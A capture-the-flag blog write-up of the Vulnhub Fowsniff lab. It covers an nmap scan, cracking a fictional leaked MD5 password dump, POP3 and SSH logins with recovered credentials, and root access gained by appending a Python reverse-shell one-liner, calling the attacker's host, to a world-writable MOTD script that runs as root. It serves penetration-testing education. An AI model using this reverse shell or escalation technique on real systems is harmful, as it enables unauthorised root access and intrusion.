---
layout:     post
title:      "Vulnhub.com - Fowsniff"
date:       2018-11-29 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Small and easy machine will be our next target, it's called  ***Fowsniff*** and it's pretty awesome.

{% highlight text %}
I created this boot2root last year to be hosted on Peerlyst.com It's beginner level, but requires more than just an exploitdb search or metasploit to run.

It was created in (and is intended to be used with) VirtualBox, and takes some extra configuration to set up in VMWare.
{% endhighlight %}

* Author: [@berzerk0](https://twitter.com/berzerk0)
* Download: [https://www.vulnhub.com/entry/fowsniff-1,262/](https://www.vulnhub.com/entry/fowsniff-1,262/)

### Solution

Let's start from the `nmap` scan. 

{% highlight text %}
root@kali:~# nmap -sC -sV -sS -A 10.0.0.4
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-29 14:33 EST
Nmap scan report for 10.0.0.4
Host is up (0.00051s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) TOP RESP-CODES CAPA USER AUTH-RESP-CODE UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LITERAL+ IDLE OK ENABLE more Pre-login capabilities post-login listed LOGIN-REFERRALS IMAP4rev1 have ID AUTH=PLAINA0001 SASL-IR
MAC Address: 08:00:27:66:85:17 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 10.0.0.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds
{% endhighlight %}

We have a website, `pop3` and `imap` ports and and `ssh`. We can try to gather as much information as we can from the site firstly.

{% highlight html %}
root@kali:~# curl 10.0.0.4:80
	<a href="#" class="image featured">
		<img src="images/pic01.jpg" alt="" />
	</a>
	<p>Fowsniff's internal system suffered a data breach that
	resulted in the exposure of employee usernames and passwords.</p>

	<p><strong>Client information was not affected.</strong></p>

	<p>Due to the strong possibility that employee information has
	been  made publicly available, all employees have been
	instructed to change their passwords immediately.</p>

	<p>The attackers were also able to hijack our official@fowsniffcorp Twitter account.
	All of our official tweets have been deleted and the attackers
	may release sensitive information via this medium. We are
	working to resolve this at soon as possible.</p>

	<p>We will return to full capacity after a service upgrade.</p>
{% endhighlight %}

If you read closely, they're mentioning that employee passwords were breached. But I could not find it anywhere in the machine, together with no further way to access the system or at least find a hint. 

At that moment I decided to search in Google, kind of not knowing where to look. But there they are, in [pastebin](https://pastebin.com/NrAqVeeX) note - password dump.

{% highlight text %}
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.
{% endhighlight %}

That was pretty new to me so I've spent a lot of time not looking for dumps on the Internet, but instead finding ways to break into machine. 

After finding them, we can start cracking using [Crackstation](https://crackstation.net/). 


{% highlight text %}
8a28a94a588a95b80163709ab4313aa4	md5	mailcall
ae1644dac5b77c0cf51e0d26ad6d7e56	md5	bilbo101
1dc352435fecca338acfd4be10984009	md5	apples01
19f5af754c31f1e2651edde9250d69bb	md5	skyler22
90dc16d47114aa13671c697fd506cf26	md5	scoobydoo2
a92b8a29ef1183192e3d35187e0cfabd	Unknown	Not found.
0e9588cb62f4b6f27e33d449e2ba0b3b	md5	carp4ever
4d6e42f56e127803285a0a7649b5ab11	md5	orlando12
f7fd98d380735e859f8b2ffbbede5a7e	md5	07011972
{% endhighlight %}

Great, most of them were easily found. Now let's figure out, whether is there any password pair that can give us access to any service? As in the dump there were mails and hashes, I decided to start from the `pop3` service. We can do this by hand, as the there are only 8 pairs.  

{% highlight text %}
root@kali:~# nc 10.0.0.4 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
RETR 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.
{% endhighlight %}

Once again, we get lucky. Notice how we get the temporary password in the first mail, with a note that the password should be changed as soon as possible? 

Combine it with the fact that user `baksteen` haven't read this mail, so there's a big chance that her password wasn't changed. 

{% highlight text %}
root@kali:~# ssh baksteen@10.0.0.4
baksteen@10.0.0.4's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ ls -la
total 40
drwxrwx---  4 baksteen baksteen 4096 Mar 13  2018 .
drwxr-xr-x 11 root     root     4096 Mar  8  2018 ..
-rw-------  1 baksteen users       1 Mar 13  2018 .bash_history
-rw-r--r--  1 baksteen users     220 Aug 31  2015 .bash_logout
-rw-r--r--  1 baksteen users    3771 Aug 31  2015 .bashrc
drwx------  2 baksteen users    4096 Mar  8  2018 .cache
-rw-r--r--  1 baksteen users       0 Mar  9  2018 .lesshsQ
drwx------  5 baksteen users    4096 Mar  9  2018 Maildir
-rw-r--r--  1 baksteen users     655 May 16  2017 .profile
-rw-r--r--  1 baksteen users      97 Mar  9  2018 term.txt
-rw-------  1 baksteen users    2981 Mar 13  2018 .viminfo
baksteen@fowsniff:~$ cat term.txt
I wonder if the person who coined the term "One Hit Wonder" 
came up with another other phrases.
{% endhighlight %}

And here we are in the system. What now? 

As always I decided to firstly follow [G0tmi1k cheatsheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) regarding privilage escalation, and once again we have something interesting, while looking for world writable files. 

{% highlight text %}
baksteen@fowsniff:~$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null
/opt/cube
/var/mail


baksteen@fowsniff:~$ cd /opt/cube
baksteen@fowsniff:/opt/cube$ ls -la
total 12
drwxrwxrwx 2 root   root  4096 Mar 11  2018 .
drwxr-xr-x 6 root   root  4096 Mar 11  2018 ..
-rw-rwxr-- 1 parede users  851 Mar 11  2018 cube.sh
baksteen@fowsniff:/opt/cube$ cat cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
{% endhighlight %}

Okay, we can easily write reverse shell into that file but what will execute it as a root? I decied to do recursive grep with name of this script as the string to find. 

{% highlight text %}
baksteen@fowsniff:/opt/cube$ grep -r "cube.sh" / 2>/dev/null
/home/baksteen/.viminfo:> /opt/cube/cube.sh
/home/baksteen/.viminfo:> /etc/update-motd.d/cube.sh
/var/lib/apt/lists/us.archive.ubuntu.com_ubuntu_dists_xenial_universe_i18n_Translation-en: institutions. The CafeOBJ cube shows the structure of the various
/etc/update-motd.d/00-header:sh /opt/cube/cube.sh
{% endhighlight %}

Now we can see that `00-header` uses `cube.sh` - that's the file containing entry message for remote users - so it should be executed every time a new user logs with `ssh`. 

With that knowledge we can enter reverse shell. 

{% highlight text %}
baksteen@fowsniff:/opt/cube$ cat cube.sh 
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

For some reasons, I could not spawn reverse shell while executing it with `bash` or `nc` so I decided to try `python` reverse shell after that. 

Now let's log in once again with `ssh` to trigger the script. 

{% highlight text %}
root@kali:~# ssh baksteen@10.0.0.4
baksteen@10.0.0.4's password: 
{% endhighlight %}

And check on our listener. 

{% highlight text %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.4: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.4] 43610
/bin/sh: 0: can't access tty; job control turned offW
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
{% endhighlight %}